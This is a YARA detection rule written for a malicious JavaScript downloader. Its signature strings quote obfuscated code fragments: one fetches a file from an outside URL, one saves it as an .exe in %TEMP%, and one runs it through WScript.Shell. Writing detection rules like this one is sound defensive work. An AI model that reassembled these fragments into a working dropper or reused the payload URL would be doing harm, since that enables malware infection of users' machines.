rule sig_20160328_7015c00ce0ed83b656ce41d11c18147f {
  meta:
    description = "datamaliciousorder - file 20160328_7015c00ce0ed83b656ce41d11c18147f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ef3405bae89b3d3da3467c13b32d664edf0062ec4e561867b5fc9b4df1070b69"

  strings:
    $s1  = "function Bjryics() {return Qzfskwtj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"7yKqnmvX3HvIVJ.exe\";};" fullword ascii
    $s2  = "Xugihrylqo[Pxnoafsj](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Bfgjbkvjn](Iqpsrjb() * 11)} while (Xugihrylqo[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Qzfskwtj = function Hpodyqndgx() {return WScript[Rcgtoujvw](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Jncnk(Crlbqt, Wxokwjt){return Crlbqt - Wxokwjt;};" fullword ascii
    $s6  = "function Rfaetonf() {return ((Qmjgdjy == true) && (Qmjgdjy == Heurdffay)) ? 1 : Nmgxywp;};" fullword ascii
    $s7  = "return Jncnk(Pmkolho, Riblgxkuqh);" fullword ascii
    $s8  = "function Vkyock(Jdgiopdsxl) {var Supdflenc = (1, 2, 3, 4, 5, Jdgiopdsxl); return Supdflenc;};" fullword ascii
    $s9  = "function Wvwugszf(){return Rcgtoujvw;};" fullword ascii
    $s10 = "var Heurdffay = false;" fullword ascii
    $s11 = "var Qtbbnj = false;" fullword ascii
    $s12 = "Qmjgdjy = true; " fullword ascii
    $s13 = "Heurdffay = true; " fullword ascii
    $s14 = "function Iqpsrjb(){return 22;};" fullword ascii
    $s15 = "function Nhpald(){return Frzpxammu;};" fullword ascii
    $s16 = "function Wrimljs()" fullword ascii
    $s17 = " while (Svinkdr){" fullword ascii
    $s18 = "var Qmjgdjy = false;" fullword ascii
    $s19 = "function Zcamst(Zgthzd){Qzfskwtj[\"Run\"](Zgthzd, Nmgxywp, Nmgxywp);};" fullword ascii
    $s20 = "var Whrcsccak = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}